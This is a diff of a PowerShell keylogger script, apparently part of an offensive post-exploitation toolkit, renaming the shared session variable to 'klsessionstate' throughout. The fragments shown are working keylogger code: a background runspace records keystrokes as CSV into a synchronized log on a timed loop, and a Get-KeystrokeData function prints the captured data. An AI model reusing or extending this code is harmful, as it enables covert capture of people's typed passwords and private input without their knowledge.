@@ -211,7 +211,7 @@ function Get-Keystrokes {
 
                     # Stupid hack since Export-CSV doesn't have an append switch in PSv2
                     `$CSVEntry = (`$ResultsObject | ConvertTo-Csv -NoTypeInformation)[1]
-                    `$sessionstate.log += `$CSVEntry
+                    `$klsessionstate.log += `$CSVEntry
                    
                 }
             }
@@ -225,15 +225,15 @@ while (`$sw.elapsed -lt `$timeout){Keylog}
 
 "@
 
-$global:sessionstate = "2"
+$global:klsessionstate = "2"
 $PollingInterval = 40
 
-$global:sessionstate = [HashTable]::Synchronized(@{})
-$sessionstate.log = New-Object System.Collections.ArrayList
+$global:klsessionstate = [HashTable]::Synchronized(@{})
+$klsessionstate.log = New-Object System.Collections.ArrayList
 
 $HTTP_runspace = [RunspaceFactory]::CreateRunspace()
 $HTTP_runspace.Open()
-$HTTP_runspace.SessionStateProxy.SetVariable('sessionstate',$sessionstate)
+$HTTP_runspace.SessionStateProxy.SetVariable('klsessionstate',$klsessionstate)
 $HTTP_powershell = [PowerShell]::Create()
 $HTTP_powershell.Runspace = $HTTP_runspace
 $HTTP_powershell.AddScript($scriptblock) > $null
@@ -249,5 +249,5 @@ echo ""
 function Get-KeystrokeData {
     echo ""
     "[+] Keylog data:"
-    echo $sessionstate.log
+    echo $klsessionstate.log
 }
